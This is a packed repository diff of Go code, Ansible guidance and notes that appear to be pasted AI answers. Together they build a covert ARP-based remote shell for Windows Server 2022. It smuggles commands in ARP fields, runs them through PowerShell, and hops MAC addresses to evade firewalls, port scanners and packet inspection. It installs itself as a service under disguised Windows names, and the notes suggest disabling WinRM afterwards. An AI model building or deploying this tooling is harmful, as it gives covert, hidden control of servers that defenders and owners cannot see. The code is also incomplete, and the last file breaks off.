@@ -1,0 +1,1333 @@
+This file is a merged representation of a subset of the codebase, containing specifically included files, combined into a single document by Repomix.
+
+<file_summary>
+This section contains a summary of this file.
+
+<purpose>
+This file contains a packed representation of a subset of the repository's contents that is considered the most important context.
+It is designed to be easily consumable by AI systems for analysis, code review,
+or other automated processes.
+</purpose>
+
+<file_format>
+The content is organized as follows:
+1. This summary section
+2. Repository information
+3. Directory structure
+4. Repository files (if enabled)
+5. Multiple file entries, each consisting of:
+  - File path as an attribute
+  - Full contents of the file
+</file_format>
+
+<usage_guidelines>
+- This file should be treated as read-only. Any changes should be made to the
+  original repository files, not this packed version.
+- When processing this file, use the file path to distinguish
+  between different files in the repository.
+- Be aware that this file may contain sensitive information. Handle it with
+  the same level of security as you would the original repository.
+</usage_guidelines>
+
+<notes>
+- Some files may have been excluded based on .gitignore rules and Repomix's configuration
+- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
+- Only files matching these patterns are included: Windows/blue-team-technical-director
+- Files matching patterns in .gitignore are excluded
+- Files matching default ignore patterns are excluded
+- Files are sorted by Git change count (files with more changes are at the bottom)
+</notes>
+
+</file_summary>
+
+<directory_structure>
+Windows/blue-team-technical-director/ansible-hints.md
+Windows/blue-team-technical-director/crafter.go
+Windows/blue-team-technical-director/fragmentation.go
+Windows/blue-team-technical-director/hints.md
+Windows/blue-team-technical-director/linux-reassembly.go
+Windows/blue-team-technical-director/mac-generator.go
+Windows/blue-team-technical-director/main.go
+Windows/blue-team-technical-director/predict-next-mac.go
+Windows/blue-team-technical-director/ps-execution.go
+Windows/blue-team-technical-director/README.md
+Windows/blue-team-technical-director/route-cmd.go
+Windows/blue-team-technical-director/run-arp-shell.go
+Windows/blue-team-technical-director/service-mode.ps1
+Windows/blue-team-technical-director/windows-reassembly.go
+</directory_structure>
+
+<files>
+This section contains the contents of the repository's files.
+
+<file path="Windows/blue-team-technical-director/ansible-hints.md">
+Since your boss is an Ansible fan and you're dealing with multiple Windows Server 2022 targets, the most efficient way to deploy your custom Go agent is through a **Role-based architecture**.
+
+In Ansible, a **Role** allows you to package the .exe, the nssm.exe helper, and the configuration logic into a single, reusable unit. This is perfect for deploying your "ArpRmmAgent" to 2, 5, or 50 servers at once.
+
+---
+
+## **1\. The High-Level Architecture (Ansible Deployment)**
+
+Your Linux Admin box will act as the **Ansible Control Node**. It will push the files over WinRM (the standard way Ansible talks to Windows) to install the ARP-based "hidden" service.
+
+---
+
+## **2\. The Recommended Folder Structure**
+
+Based on your boss's hints, here is how you should organize your project files on your Linux box before deployment:
+
+Plaintext  
+arp-rmm-deploy/  
+├── ansible.cfg          \# Configures WinRM connection settings  
+├── inventory.ini        \# Lists your Windows Server 2022 IPs  
+├── site.yml             \# The main entry-point playbook  
+└── roles/  
+    └── arp\_agent/       \# The specific role for our RMM  
+        ├── files/  
+        │   ├── agent.exe      \# Your compiled Go binary  
+        │   └── nssm.exe       \# The service manager  
+        ├── tasks/  
+        │   └── main.yml       \# The "how-to" install logic  
+        └── vars/  
+            └── main.yml       \# Variables like the Service Name
+
+---
+
+## **3\. Step-by-Step Build Sequence (The Ansible Way)**
+
+### **Step 1: Define Your Inventory (inventory.ini)**
+
+Group your Windows servers here.
+
+Ini, TOML  
+\[windows\_servers\]  
+server01.corp.local  
+server02.corp.local
+
+\[windows\_servers:vars\]  
+ansible\_user=AdminUser  
+ansible\_password=SecretPassword  
+ansible\_connection=winrm  
+ansible\_winrm\_server\_cert\_validation=ignore
+
+### **Step 2: Create the Install Logic (roles/arp\_agent/tasks/main.yml)**
+
+This is the heart of the deployment. It handles the "Life Cycle" of the agent on the remote Windows boxes.
+
+YAML  
+\---  
+\- name: Create deployment directory  
+  win\_file:  
+    path: C:\\ProgramData\\WinTelemetry  
+    state: directory
+
+\- name: Copy Agent and NSSM binaries  
+  win\_copy:  
+    src: "{{ item }}"  
+    dest: C:\\ProgramData\\WinTelemetry\\  
+  loop:  
+    \- agent.exe  
+    \- nssm.exe
+
+\- name: Check if Npcap is installed (Requirement for ARP)  
+  win\_shell: Get-Service \-Name "npcap"  
+  register: npcap\_check  
+  ignore\_errors: yes
+
+\- name: Install Agent as a Service using NSSM  
+  win\_shell: |  
+    ./nssm.exe install "{{ service\_name }}" "C:\\ProgramData\\WinTelemetry\\agent.exe"  
+    ./nssm.exe set "{{ service\_name }}" DisplayName "{{ display\_name }}"  
+    ./nssm.exe set "{{ service\_name }}" Description "{{ description }}"  
+    ./nssm.exe set "{{ service\_name }}" Start SERVICE\_AUTO\_START  
+    Start-Service "{{ service\_name }}"  
+  args:  
+    chdir: C:\\ProgramData\\WinTelemetry\\  
+  when: npcap\_check.rc \== 0
+
+### **Step 3: Run the Playbook (site.yml)**
+
+This is the file you actually execute to trigger the whole process.
+
+YAML  
+\---  
+\- name: Deploy ARP RMM Agent to Windows Cluster  
+  hosts: windows\_servers  
+  roles:  
+    \- arp\_agent
+
+---
+
+## **4\. Advanced "Pro" Features for Ansible**
+
+* **Template-Based PSKs:** Use templates/ to create a unique configuration file for each server. You can give every server a different **Pre-Shared Key** so that if one is compromised, the others remain secure.  
+* **Handshake Validation:** Add a final task in your playbook that waits for the Linux box to receive an "Initial ARP Check-in" from the server before marking the deployment as "Successful."  
+* **WinRM Hardening:** Since you're using WinRM to deploy, your boss might like it if you use Ansible to *disable* WinRM once the ARP agent is confirmed to be working—effectively "cutting the ladder" behind you.
+
+### **Summary of Files vs. Folders**
+
+| Ansible Component | Purpose for your RMM |
+| :---- | :---- |
+| files/ | Stores the agent.exe you compiled in Go. |
+| vars/ | Stores the "Stealth" names like "Print Spooler Extension". |
+| tasks/ | The sequential steps to move files and start the service. |
+| inventory/ | The master list of all Windows Servers your boss wants monitored. |
+
+To connect to Windows Server 2022 from a Linux control node, your ansible.cfg needs to be tuned for the **WinRM** (Windows Remote Management) transport rather than the default SSH.
+
+On Windows Server 2022, WinRM often requires specific message encryption settings and certificate handling to function reliably over a network.
+
+---
+
+## **1\. The ansible.cfg File**
+
+Place this file in the root of your arp-rmm-deploy/ directory. It tells Ansible how to behave globally for this project.
+
+Ini, TOML
+
+\[defaults\]
+
+\# 1\. Point to your inventory of Windows Servers
+
+inventory \= inventory.ini
+
+\# 2\. Set the default remote user (can be overridden in host\_vars)
+
+remote\_user \= Administrator
+
+\# 3\. Roles path for our 'arp\_agent' role
+
+roles\_path \= ./roles
+
+\# 4\. Disable host key checking for faster initial deployment
+
+\# (Ensure your environment is secure before doing this in production)
+
+host\_key\_checking \= False
+
+\# 5\. Use the 'yaml' callback for more readable output in the terminal
+
+stdout\_callback \= yaml
+
+\[privilege\_escalation\]
+
+\# Windows doesn't use sudo, but this section is good practice for 
+
+\# cross-platform compatibility.
+
+become \= False
+
+\[powershell\]
+
+\# Ensure Ansible uses the correct execution policy for your Go agent scripts
+
+execution\_policy \= ByPass
+
+\[ssh\_connection\]
+
+\# This section is ignored for Windows, as we use WinRM below.
+
+pipelining \= True
+
+---
+
+## **2\. The High-Level Architecture (The WinRM Pipe)**
+
+While your RMM tool uses **ARP**, Ansible needs **WinRM** (running on ports 5985/5986) to perform the initial installation. Once the agent.exe is installed, you can technically turn WinRM off.
+
+---
+
+## **3\. Step-by-Step Build Sequence (The Connection)**
+
+### **Step 1: Install Dependencies**
+
+For Ansible to speak WinRM, you must install the pywinrm library on your **Linux** box:
+
+Bash
+
+pip install "pywinrm\>=0.3.0"
+
+### **Step 2: Define Connection Variables**
+
+While ansible.cfg handles global settings, you should define the specific Windows connection details in your inventory.ini or group\_vars/windows.yml.
+
+**In your inventory.ini:**
+
+Ini, TOML
+
+\[windows:vars\]
+
+\# Use WinRM instead of SSH
+
+ansible\_connection=winrm
+
+\# Use NTLM or Kerberos (NTLM is easiest for lab environments)
+
+ansible\_winrm\_transport=ntlm
+
+\# Use HTTPS (5986) if possible; use HTTP (5985) for basic challenges
+
+ansible\_winrm\_server\_cert\_validation=ignore
+
+ansible\_port=5985
+
+### **Step 3: Test the Connection**
+
+Before running your full RMM deployment, run a simple "ping" to verify the Linux-to-Windows link:
+
+Bash
+
+ansible windows \-m win\_ping
+
+---
+
+## **4\. Advanced "Pro" Features for Windows 2022**
+
+* **Async Tasks:** If your Go agent installation involves a long-running process (like installing Npcap drivers), use the async keyword in your tasks to prevent Ansible from timing out.  
+* **WinRM Hardening:** For Windows Server 2022, you should ideally use **Kerberos** authentication. This requires joining your Linux box to the same domain as the Windows servers, providing much higher security than NTLM.  
+* **Custom Filter Plugins:** Your boss mentioned the filter\_plugins/ folder. You could write a small Python filter that takes a server's MAC address and automatically generates the **Initial Sequence ID** for the ARP hopping, so the Ansible playbook and the Go agent are perfectly in sync from second one.
+
+### **Summary Table for the IT Admin**
+
+| Setting | Recommended Value | Reason |
+| :---- | :---- | :---- |
+| ansible\_connection | winrm | Windows does not natively support SSH for Ansible. |
+| ansible\_winrm\_transport | ntlm or credssp | Required for authentication on modern Windows Server. |
+| stdout\_callback | yaml | Makes it easier to read error logs when PowerShell fails. |
+| host\_key\_checking | False | Prevents the "Accept Fingerprint" prompt during mass deployment. |
+
+To tie everything together, your site.yml acts as the "Master Controller." It maps your group of Windows servers (defined in your inventory.ini) to the specific arp\_agent role you've built.
+
+### **1\. The site.yml Playbook**
+
+Place this in your root arp-rmm-deploy/ directory.
+
+YAML
+
+\---
+
+\- name: Deploy Custom ARP-Based RMM Agent
+
+  hosts: windows\_servers
+
+  gather\_facts: yes
+
+
+  \# Global variables for the role (can be overridden in host\_vars)
+
+  vars:
+
+    service\_name: "WinNetExtension"
+
+    display\_name: "Windows Network Extension Service"
+
+    description: "Handles low-level hardware resolution and legacy network mapping."
+
+    deploy\_path: "C:\\\\ProgramData\\\\WinNetExt"
+
+    psk\_secret: "S3cur3\_Adm1n\_K3y" \# Match this to your Go code\!
+
+  roles:
+
+    \- role: arp\_agent
+
+      become: no \# We use LocalSystem via NSSM instead of 'become'
+
+---
+
+### **2\. The Execution Command**
+
+On your Linux Admin box, you would trigger the entire deployment with a single command from the root folder:
+
+Bash
+
+ansible-playbook \-i inventory.ini site.yml
+
+---
+
+### **3\. Step-by-Step Deployment Flow (What Happens Internally)**
+
+1. **Connection:** Ansible reads ansible.cfg, sees the winrm transport, and establishes a secure PowerShell session to every server in your inventory.ini.  
+2. **Fact Gathering:** Ansible runs Gathers Facts to ensure the target is actually Windows and to check architecture (x64).  
+3. **Role Execution:**  
+   * **Directory Setup:** Creates C:\\ProgramData\\WinNetExt.  
+   * **Binary Push:** Uploads your compiled agent.exe and nssm.exe from your Linux files/ folder.  
+   * **Service Registration:** Runs the nssm commands to lock the agent into the Windows Service Control Manager.  
+4. **Verification:** The playbook attempts to start the service and checks the exit code.
+
+---
+
+### **4\. Advanced "Pro" Features for the Final Submission**
+
+* **Idempotency:** The win\_copy and win\_file modules are idempotent by nature. If you run the playbook a second time, it won't re-upload the files unless they have changed.  
+* **Dynamic PSKs:** In a real-world "Challenge," you shouldn't use the same PSK for every server. You can use an Ansible **Jinja2 filter** to generate a PSK based on the server's BIOS UUID:  
+  psk\_secret: "{{ ansible\_system\_vendor | hash('sha256') }}"
+
+**Firewall Management:** You can add a task to ensure the Windows Firewall allows the Npcap driver to bypass standard filtering for ARP:  
+YAML  
+\- name: Ensure Npcap driver is allowed
+
+  win\_shell: Enable-NetAdapterBinding \-Name "\*" \-ComponentID "ms\_tcpip" \# Example binding logic
+
+* 
+
+---
+
+### **Summary of the Final Package**
+
+| File | Role |
+| :---- | :---- |
+| **ansible.cfg** | Sets the "Rules of Engagement" (WinRM, Timeout). |
+| **inventory.ini** | The "Target List" (Windows Server IPs/Names). |
+| **site.yml** | The "Mission Brief" (Assigns the Agent role to the Servers). |
+| **roles/arp\_agent/** | The "Toolbox" (Contains the actual code and install steps). |
+</file>
+
+<file path="Windows/blue-team-technical-director/crafter.go">
+// The Go "Packet Crafter"
+// This script demonstrates how to take a 4-character string (like "SHUT" or "INIT"), pack it into the SourceProtAddress field of an ARP frame, and broadcast it over the wire.
+package main
+
+import (
+	"log"
+	"net"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
+)
+
+func main() {
+	// 1. Define the network interface (Update this to your actual interface, e.g., "eth0")
+	device := "eth0"
+	handle, err := pcap.OpenLive(device, 1024, false, pcap.BlockForever)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer handle.Close()
+
+	// 2. The data we want to "smuggle" (Must be 4 bytes/chars)
+	payload := "HELO" 
+	payloadBytes := []byte(payload)
+
+	// 3. Create the Ethernet Layer
+	// We use a broadcast MAC so every machine on the segment "sees" it.
+	eth := &layers.Ethernet{
+		SrcMAC:       net.HardwareAddr{0x00, 0x11, 0x22, 0x33, 0x44, 0x55},
+		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
+		EthernetType: layers.EthernetTypeARP,
+	}
+
+	// 4. Create the ARP Layer (The "Payload")
+	arp := &layers.ARP{
+		AddrType:          layers.LinkTypeEthernet,
+		Protocol:          layers.EthernetTypeIPv4,
+		HwAddressSize:     6,
+		ProtAddressSize:   4,
+		Operation:         layers.ARPRequest, // Masking as a request
+		SourceHwAddress:   []byte{0x00, 0x11, 0x22, 0x33, 0x44, 0x55},
+		
+		// ENCODING STEP: We put our string bytes directly into the Source IP field
+		SourceProtAddress: payloadBytes, 
+		
+		TargetHwAddress:   []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+		TargetProtAddress: []byte{0x00, 0x00, 0x00, 0x00},
+	}
+
+	// 5. Serialize and Send
+	buffer := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	gopacket.SerializeLayers(buffer, opts, eth, arp)
+	
+	if err := handle.WritePacketData(buffer.Bytes()); err != nil {
+		log.Fatal(err)
+	}
+
+	log.Printf("Sent ARP packet with encoded payload: %s", payload)
+}
+</file>
+
+<file path="Windows/blue-team-technical-director/fragmentation.go">
+// To handle a command like RESTART_IIS (11 characters) using a protocol that only gives us 4 bytes per "Source IP" field, we have to implement a Segmentation and Reassembly (SAR) strategy.Since we are using the Source Protocol Address (SPA) field for our payload, we will reserve the first byte as a Control Byte and the remaining 3 bytes for Data.The Control Byte Structure (8 bits)Bit 7 (MSB): "More Fragments" flag ($1$ = more coming, $0$ = last packet).Bits 0-6: Sequence ID (0 to 127). This allows the receiver to reorder packets if they arrive out of sync.1. The Fragmentation Logic (Go)This function takes a string and breaks it into a slice of 4-byte payloads ready for the ARP SourceProtAddress field.
+func FragmentCommand(command string) [][]byte {
+	const maxDataSize = 3 // We use 1 byte for header, 3 for data
+	cmdBytes := []byte(command)
+	var fragments [][]byte
+
+	for i := 0; i < len(cmdBytes); i += maxDataSize {
+		end := i + maxDataSize
+		if end > len(cmdBytes) {
+			end = len(cmdBytes)
+		}
+
+		// Create the 4-byte ARP field buffer
+		fragment := make([]byte, 4)
+		
+		// Set Control Byte
+		seqID := byte(len(fragments))
+		if end < len(cmdBytes) {
+			fragment[0] = 0x80 | seqID // Set "More Fragments" bit (0x80)
+		} else {
+			fragment[0] = seqID        // Last fragment
+		}
+
+		// Copy data (up to 3 bytes)
+		copy(fragment[1:], cmdBytes[i:end])
+		fragments = append(fragments, fragment)
+	}
+	return fragments
+}
+</file>
+
+<file path="Windows/blue-team-technical-director/hints.md">
+sudo apt-get install libpcap-dev
+go get github.com/google/gopacket
+
+Step 1: The Sender (Linux Admin Box)
+The Admin box takes the command RESTART_IIS, runs it through the FragmentCommand function, and gets 4 chunks:
+
+[0x81, 'R', 'E', 'S'] (0x81 = More bits + Seq 1)
+
+[0x82, 'T', 'A', 'R'] (0x82 = More bits + Seq 2)
+
+[0x83, 'T', '_', 'I'] (0x83 = More bits + Seq 3)
+
+[0x04, 'I', 'S', 0x00] (0x04 = Final + Seq 4)
+
+It then loops through these and sends 4 separate ARP requests to the network.
+
+Step 2: The Receiver (Windows Server Agent)
+The Windows agent needs a Reassembly Buffer.
+
+It sniffs an ARP packet.
+
+It checks the Control Byte (Index 0).
+
+It stores the data (Indices 1-3) in a map: buffer[sequenceID] = data.
+
+If the "More Fragments" bit is 0, it knows the command is complete.
+
+Step 3: Execution
+Once the "Last Fragment" is received, the agent:
+
+Sorts the map by keys (Sequence IDs).
+
+Concatenates the byte slices into a single string.
+
+Passes that string to a switch statement or a PowerShell execution block.
+
+4. Advanced "Pro" Features for this Logic
+Acknowledgment (ACK): To make it reliable, the Windows Server should send an ARP Reply back to the Admin box with the same Sequence ID in its Target IP field to confirm receipt. If the Admin doesn't get an ACK, it resends that specific fragment.
+
+Session IDs: If multiple Admins are sending commands, add a 4-bit Session ID to the Control Byte so the Windows Server doesn't mix up fragments from different sources.
+
+Zero-Padding: Since commands aren't always multiples of 3, use 0x00 (null bytes) to pad the final packet. The receiver should trim these before executing.
+
+---
+
+Integration and Execution Flow
+To make this a functional RMM tool for your Windows Server 2022 environment, here is how the "Software Engineer" would wire it all together:
+
+Privilege Elevation: The Go binary must manifest with requireAdministrator to hook into Npcap and execute system-level commands.
+
+The Parser: Instead of just printing the command, use a switch statement to map short "Smuggled" strings to full PowerShell scripts. This keeps the ARP traffic minimal.
+
+RESTART_IIS -> Restart-Service W3SVC
+
+ST_SRV_MSSQL -> Start-Service 'MSSQLSERVER'
+
+The Loop: Use a pcap.Handle in a for loop to continuously sniff. Set a BPF (Berkeley Packet Filter) of arp and dst host [Admin_MAC] so the agent only processes traffic intended for it.
+
+Security Consideration for the "Boss"
+Since ARP has no native encryption, anyone with a packet sniffer (like Wireshark) on the same VLAN can see these commands. To solve this, you could:
+
+XOR Encoding: Obfuscate the payload bytes with a pre-shared key before sending.
+
+Timestamp Verification: Include a coarse timestamp in the control byte to prevent "Replay Attacks" (where someone captures your "SHUTDOWN" ARP packet and sends it again later).
+
+---
+
+The "Pro" Level Build Sequence
+To make this truly functional for an IT Admin, you need to handle the Response Loop.
+
+The Problem: ARP is unidirectional in this context. If the Windows Server runs Get-Service, how does the Linux Admin see the result?
+
+The Solution: Reverse Fragmentation. The Windows Agent must become the "Sender," breaking the PowerShell output into 3-byte chunks and broadcasting them back as ARP packets. The Linux Admin box then sniffs these and reassembles them to display the result on the console.
+
+Summary of the Software Architecture
+Admin (Linux): Fragments "GET_SERVICES" -> Sends 4 ARP Requests.
+
+Agent (Windows): Sniffs ARP -> Reassembles -> Executes PowerShell.
+
+Agent (Windows): Captures Stdout -> Fragments Output -> Sends 50 ARP Requests.
+
+Admin (Linux): Sniffs ARP -> Reassembles -> Prints Table to Admin's Terminal.
+
+Final Implementation Checklist for Windows Server 2022
+Npcap Installation: Ensure Npcap is installed in "WinPcap API-compatible mode."
+
+Service Persistence: Use a tool like NSSM (Non-Sucking Service Manager) to wrap your Go binary as a Windows Service so it starts automatically at boot.
+
+Firewall: Add an inbound rule for Local UDP Port 137/138/139 or just ensure the Npcap driver has "Bind to Adapter" enabled; usually, raw packet sniffing bypasses the standard Windows Firewall stack entirely.
+
+--- 
+
+The Linux side of this ARP-based RMM is functionally a mirror of the Windows agent, but with one critical difference: it must operate in Promiscuous Mode. While the Windows Server is looking for commands, the Linux box is listening for "Exfiltrated Data" (the results of those commands) being "shouted" back across the wire via ARP.
+
+To build this as a software engineer, you would use a ConcurrentTimeout pattern. Since you don't know how long the Windows command will take to run, the Linux side must listen until it sees a packet with the "Final" bit set, or a timeout occurs.
+
+1. The High-Level Architecture (Response Loop)
+On the Linux side, we use a Sync.Map or a standard map protected by a mutex to handle the incoming response fragments. This ensures that even if packets arrive out of order due to network jitter, the final output is coherent.
+
+2. The Linux Reassembly Code (Go)
+This script uses gopacket to sniff the network interface, filter for ARP packets coming from the Windows Server's MAC address, and reassemble the payload.
+
+---
+3. Step-by-Step Build Sequence (The "Pro" Level)
+To make this a reliable IT tool, the software engineer needs to solve three specific challenges:
+
+Step 1: Handling Large Outputs
+If you run Get-Process, the output might be 5,000 characters. At 3 bytes per ARP packet, that is 1,666 packets.
+
+Implementation: The Windows agent must have a "Sender" loop that iterates through the string, creates the ARP frames, and sends them with a tiny delay (time.Sleep(10 * time.Millisecond)) to avoid overwhelming the network switch's buffer.
+
+Step 2: The "Handshake" (Admin Logic)
+Since you are a student/engineer, you know that a "Blind Send" is risky.
+
+Implementation: 1.  Linux sends "Command Start" ARP.
+2.  Windows sends "ACK" ARP.
+3.  Windows sends Data Fragments.
+4.  Linux sends "Received All" ARP.
+
+Step 3: Performance Tuning on Linux
+Because Linux is sniffing in promiscuous mode, it sees every ARP packet on the network (gateways, other PCs, etc.).
+
+Implementation: Use a Kernel-level BPF filter. Instead of letting the Go code discard packets, the handle.SetBPFFilter("arp and ether src " + winServerMAC) command tells the Linux kernel to only pass relevant packets to your application, drastically reducing CPU usage.
+
+---
+To achieve a functional "ARP Shell" that looks like randomized network noise, we have to move away from static MAC addresses. In a standard network, seeing thousands of ARP requests from the same MAC address is a "loud" anomaly.
+
+To hide this, we will implement MAC Address Hopping. Instead of using your real hardware address, the Linux Admin and the Windows Server will generate a new, pseudo-random MAC address for every single fragment sent.
+
+1. The "Hopping" Logic (The Obfuscation)
+The trick is to use a Pre-Shared Key (PSK) and a Seed (like the current Unix minute or a sequence ID) to generate the next MAC address in the chain. Both the Admin and the Agent must stay in sync so they know which "random" MAC to listen for.
+
+--- 
+2. Advanced Feature: The "ARP Shell"
+The "ARP Shell" is a wrapper that manages the terminal state, the sequence IDs, and the bidirectional fragmentation. It functions like a half-duplex radio: Admin Sends -> Agent Processes -> Agent Responds -> Admin Displays.
+
+The Admin Loop (Linux)
+The Admin side acts as the "Master." It prompts for input, fragments it, and then shifts into "Sniffer Mode" to wait for the response.
+
+--- 
+Step-by-Step Build Sequence for the Shell
+The Handshake: Admin sends a broadcast ARP with a specific "Start" payload.
+
+State Sync: Both devices initialize their SequenceID to 0 and load the PSK.
+
+Command Phase: Linux sends fragmented command -> Windows Reassembles.
+
+Response Phase: Windows fragments PowerShell output -> Linux Reassembles via Reverse-Hopping.
+
+Cleanup: After the final "End of Output" fragment, both sides increment their SequenceID by a large random offset to ensure the next session starts on a completely different set of MAC addresses.
+
+Summary of the "ARP-Only" Challenge
+By the end of this build, you have a tool that:
+
+Has no IP address (immune to IP-based firewalling).
+
+Has no persistent MAC (immune to MAC filtering).
+
+Uses no TCP/UDP ports (invisible to netstat and port scanners).
+
+Encodes data in metadata (invisible to Deep Packet Inspection of payload).
+</file>
+
+<file path="Windows/blue-team-technical-director/linux-reassembly.go">
+package main
+
+import (
+	"fmt"
+	"log"
+	"sort"
+	"strings"
+	"sync"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
+)
+
+type ResponseBuffer struct {
+	mu         sync.Mutex
+	fragments  map[int][]byte
+	isComplete bool
+}
+
+func main() {
+	device := "eth0"
+	winServerMAC := "00:15:5d:01:02:03" // The MAC of your Windows 2022 Server
+
+	handle, err := pcap.OpenLive(device, 1024, true, pcap.BlockForever)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer handle.Close()
+
+	// Filter for ARP traffic only
+	if err := handle.SetBPFFilter("arp"); err != nil {
+		log.Fatal(err)
+	}
+
+	resp := &ResponseBuffer{fragments: make(map[int][]byte)}
+	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+
+	fmt.Println("[*] Listening for Windows Response via ARP...")
+
+	for packet := range packetSource.Packets() {
+		arpLayer := packet.Layer(layers.LayerTypeARP)
+		if arpLayer == nil {
+			continue
+		}
+
+		arp := arpLayer.(*layers.ARP)
+
+		// Only process packets from our target Windows Server
+		if arp.SourceHwAddress.String() != winServerMAC {
+			continue
+		}
+
+		// Decode the "Smuggled" data in the Source Protocol Address (SPA)
+		spa := arp.SourceProtAddress
+		controlByte := spa[0]
+		isFinal := (controlByte & 0x80) == 0
+		seqID := int(controlByte & 0x7F)
+		data := spa[1:]
+
+		resp.mu.Lock()
+		resp.fragments[seqID] = data
+		if isFinal {
+			resp.isComplete = true
+		}
+		
+		// If we have the final packet, reassemble and print
+		if resp.isComplete {
+			output := reassemble(resp.fragments)
+			fmt.Printf("\n--- WINDOWS SERVER RESPONSE ---\n%s\n------------------------------\n", output)
+			
+			// Reset for next command response
+			resp.fragments = make(map[int][]byte)
+			resp.isComplete = false
+		}
+		resp.mu.Unlock()
+	}
+}
+
+func reassemble(fragments map[int][]byte) string {
+	keys := make([]int, 0, len(fragments))
+	for k := range fragments {
+		keys = append(keys, k)
+	}
+	sort.Ints(keys)
+
+	var sb strings.Builder
+	for _, k := range keys {
+		sb.WriteString(strings.TrimRight(string(fragments[k]), "\x00"))
+	}
+	return sb.String()
+}
+</file>
+
+<file path="Windows/blue-team-technical-director/mac-generator.go">
+func GenerateHoppedMAC(psk string, sequenceID int) net.HardwareAddr {
+	// Use a hash of the PSK + SeqID to create a deterministic "random" MAC
+	hasher := sha256.New()
+	hasher.Write([]byte(psk + strconv.Itoa(sequenceID)))
+	hash := hasher.Sum(nil)
+
+	// Construct a MAC (6 bytes)
+	// We set the 'Locally Administered' bit (0x02) to look like a valid virtual MAC
+	mac := net.HardwareAddr{
+		0x02, 
+		hash[0], hash[1], hash[2], hash[3], hash[4],
+	}
+	return mac
+}
+</file>
+
+<file path="Windows/blue-team-technical-director/main.go">
+// To create a true "ARP Shell" experience, the application must behave like a state machine. It transitions from Command Entry (Admin typing) to Fragment Transmission (Sender) to Reverse-Hopping Sniffing (Receiver).
+
+// Because the user is an IT admin (on the Linux side) and the target is a Windows Server 2022 instance, the code needs to be robust enough to handle the half-duplex nature of ARP (where only one side "talks" at a time to avoid collisions).
+
+// 1. The High-Level Architecture (The State Machine)
+// The "Main" loop follows a strict sequence to ensure the Admin and the Agent stay in sync.
+
+// State IDLE: Wait for user input on the Linux terminal.
+
+// State SEND: Fragment the string, calculate Hopped MACs, and broadcast.
+
+// State LISTEN: Immediately switch to Promiscuous Mode, predict the next MACs, and reassemble the response.
+
+// State DISPLAY: Print the PowerShell output and return to IDLE.
+
+// 2. The Full "Main" Execution Loop (Go)
+// This logic would be compiled into a single binary. For the "Admin" mode, you’d run ./arpshell --mode admin.
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"os"
+	"strings"
+	"time"
+
+	"github.com/google/gopacket/pcap"
+)
+
+var (
+	psk         = "S3cur3_Adm1n_K3y" // Shared secret
+	currentSeq  = 0                 // Global sequence tracker
+	interfaceName = "eth0"
+)
+
+func main() {
+	// 1. Setup Network Handle
+	handle, err := pcap.OpenLive(interfaceName, 1024, true, pcap.BlockForever)
+	if err != nil {
+		fmt.Printf("Error opening interface: %v\n", err)
+		return
+	}
+	defer handle.Close()
+
+	reader := bufio.NewReader(os.Stdin)
+
+	fmt.Println("=== [ Layer 2 ARP-Shell Activated ] ===")
+	fmt.Printf("[*] Interface: %s | PSK: Enabled\n", interfaceName)
+
+	for {
+		// --- SENDER MODE ---
+		fmt.Print("\nARP-Admin> ")
+		command, _ := reader.ReadString('\n')
+		command = strings.TrimSpace(command)
+
+		if command == "exit" {
+			break
+		}
+
+		if command == "" {
+			continue
+		}
+
+		// Fragment and Send
+		fmt.Printf("[*] Sending command via %d fragments...\n", (len(command)/3)+1)
+		fragments := FragmentCommand(command) // Uses logic from previous step
+		
+		for _, frag := range fragments {
+			// Generate the hopped MAC for THIS specific fragment
+			targetMAC := PredictNextMAC(psk, currentSeq)
+			
+			// Send the raw ARP packet
+			SendARPPacket(handle, targetMAC, frag)
+			
+			currentSeq++ // Increment sequence for the next hop
+			time.Sleep(10 * time.Millisecond) // Prevent packet flooding
+		}
+
+		// --- RECEIVER MODE ---
+		fmt.Println("[*] Switching to Receiver Mode. Waiting for Windows response...")
+		
+		// This blocks until a "Final" fragment is received from the Windows Server
+		response := ListenAndReassemble(handle, psk, &currentSeq)
+		
+		fmt.Printf("\n[RESPONSE]:\n%s\n", response)
+		
+		// The 'currentSeq' is now updated and ready for the next command cycle
+	}
+}
+// 3. Step-by-Step Build Sequence for the "Pro" ShellStep 1: The "Predictive" BufferIn the ListenAndReassemble function, you cannot just listen for one MAC. You should pre-calculate the next 5 expected MACs. If the Windows Server sends a response and a packet is dropped, your Linux sniffer should see "Seq 7" and realize "Seq 6" was lost, allowing it to continue reassembling rather than hanging.Step 2: Handling the "Windows Hang"Windows Server 2022 might take 2 seconds to restart a service or 10 seconds to query a large log.Implementation: The Linux "Main" loop should have a Read Timeout. If no ARP packets are seen for 30 seconds, it should assume the command failed or the agent is offline and return to the ARP-Admin> prompt.Step 3: Optimization for Windows (Npcap)On the Windows side, the "Main" loop is the inverse. It stays in Receiver Mode indefinitely. Only after it reassembles a full command does it switch to Sender Mode to broadcast the results of the PowerShell execution.4. Advanced Feature: "Silent Heartbeats"To ensure the IT admin knows the Windows Server is actually "there" without sending loud traffic:Every 5 minutes, the Windows Agent sends one ARP packet.The MAC address for this packet is generated using PredictNextMAC(psk, "HEARTBEAT").The Linux box sniffer can run in the background. If it sees that specific MAC, it updates a "Last Seen" timestamp in the UI.Summary Table for the Software EngineerComponentFunctionLogical ValueCurrentSeqThe "Seed" for the next MAC.Ensures identity rotates.Control Byte0x80 or 0x00.Manages fragment flow.mTLS EquivalentThe PSK + SHA256.Ensures only the Admin can talk to the Agent.TransportRaw Ethernet (ARP).Bypasses the entire TCP/IP stack.
+</file>
+
+<file path="Windows/blue-team-technical-director/predict-next-mac.go">
+// To build a "Reverse-Hopping" sniffer, the Linux Admin box needs to stay one step ahead of the Windows Server. Since both sides share the same Pre-Shared Key (PSK) and increment their Sequence ID in sync, the Linux box can pre-calculate what the next hardware address will be and ignore everything else.
+
